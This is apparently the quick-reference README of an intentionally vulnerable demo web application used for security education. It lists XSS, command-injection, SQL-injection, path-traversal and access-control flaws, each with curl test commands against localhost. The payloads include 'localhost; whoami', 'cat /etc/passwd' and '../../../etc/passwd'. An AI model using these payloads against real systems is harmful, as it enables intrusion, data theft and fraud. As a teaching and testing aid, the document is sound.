# Quick Reference - All Vulnerabilities

## Technical Vulnerabilities (1-5)

### 1. Reflected XSS
- **Endpoint**: `/api/search?q=<script>alert('XSS')</script>`
- **Type**: Cross-Site Scripting
- **Test**: Enter `<script>alert('XSS')</script>` in search box

### 2. OS Command Injection
- **Endpoint**: `/api/ping?host=localhost; whoami`
- **Type**: Command Injection
- **Test**: Enter `localhost; whoami` or `localhost && cat /etc/passwd`

### 3. SQL Injection (Direct)
- **Endpoint**: `/api/user?id=' OR '1'='1`
- **Type**: SQL Injection
- **Test**: Enter `' OR '1'='1` as user ID

### 3B. SQL Injection (Second-Order)
- **Endpoint**: `/api/user-employees?userId=3`
- **Type**: Second-Order SQL Injection
- **Test**: User ID 3 has malicious SQL stored in database

### 4. Path Traversal
- **Endpoint**: `/api/file?name=../../../etc/passwd`
- **Type**: Path Traversal
- **Test**: Enter `../../../etc/passwd` as filename

### 5. Config-Based XSS (Stored)
- **Endpoint**: `/api/config-message?type=adminMessage`
- **Type**: Stored/Persistent XSS
- **Test**: Load `adminMessage` from config.json

---

## Business Logic Flaws (6-8)

### 6. IDOR - Insecure Direct Object Reference
- **Endpoint**: `/api/order?orderId=1002`
- **Type**: Broken Access Control
- **Test**: View order 1002 (belongs to another user)
- **Impact**: Access any user's order data

### 7. Negative Quantity Purchase
- **Endpoint**: `POST /api/purchase` with `quantity: -10`
- **Type**: Input Validation Failure
- **Test**: Purchase -10 laptops to gain $12,999.90
- **Impact**: Financial fraud, unlimited money generation

### 8. Missing Function-Level Access Control
- **Endpoint**: `DELETE /api/admin/delete-user?userId=1&currentUser=2`
- **Type**: Privilege Escalation
- **Test**: Non-admin user (2) deleting admin account (1)
- **Impact**: Unauthorized admin actions by regular users

---

## Quick Test Commands

```bash
# Start the application
npm start

# Test XSS
curl "http://localhost:3000/api/search?q=<script>alert('XSS')</script>"

# Test Command Injection
curl "http://localhost:3000/api/ping?host=localhost;%20whoami"

# Test SQL Injection
curl "http://localhost:3000/api/user?id='%20OR%20'1'='1"

# Test Second-Order SQL Injection
curl "http://localhost:3000/api/user-employees?userId=3"

# Test Path Traversal
curl "http://localhost:3000/api/file?name=../../../etc/passwd"

# Test IDOR
curl "http://localhost:3000/api/order?orderId=1002"

# Test Negative Quantity
curl -X POST http://localhost:3000/api/purchase \
  -H "Content-Type: application/json" \
  -d '{"productId": 501, "quantity": -10, "userId": 2}'

# Test Missing Access Control
curl -X DELETE "http://localhost:3000/api/admin/delete-user?userId=1&currentUser=2"
```

---

## Database Contents

### Users
- User 1: admin (role: admin, balance: $1000)
- User 2: john_doe (role: user, balance: $250)
- User 3: hacker (role: user, balance: $0, has malicious SQL)

### Orders
- Order 1001, 1003: Belong to admin
- Order 1002, 1004: Belong to john_doe

### Products
- Product 501: Premium Laptop ($1299.99)
- Product 502: Wireless Mouse ($29.99)
- Product 503: Mechanical Keyboard ($149.99)

---

## OWASP Top 10 Mapping

1. **A01:2021 - Broken Access Control**: #6 IDOR, #8 Missing Function Access
2. **A02:2021 - Cryptographic Failures**: N/A (no crypto in demo)
3. **A03:2021 - Injection**: #2 Command Injection, #3 SQL Injection, #3B Second-Order SQL
4. **A04:2021 - Insecure Design**: #7 Negative Quantity
5. **A05:2021 - Security Misconfiguration**: N/A
6. **A06:2021 - Vulnerable Components**: (Check with Endor Labs!)
7. **A07:2021 - Identification/Authentication**: N/A
8. **A08:2021 - Software/Data Integrity**: #5 Config-based XSS
9. **A09:2021 - Security Logging/Monitoring**: N/A
10. **A10:2021 - Server-Side Request Forgery**: N/A

---

## Detection Tools

### Will Detect (1-5):
- ✅ SAST tools (Checkmarx, SonarQube, Endor Labs)
- ✅ DAST tools (OWASP ZAP, Burp Suite)
- ✅ Dependency scanners

### Harder to Detect (6-8):
- ⚠️ Requires manual testing
- ⚠️ Business logic understanding
- ⚠️ Penetration testing
- ⚠️ Code review with security expertise

---

**⚠️ WARNING**: This is a deliberately vulnerable application for security testing and education only!
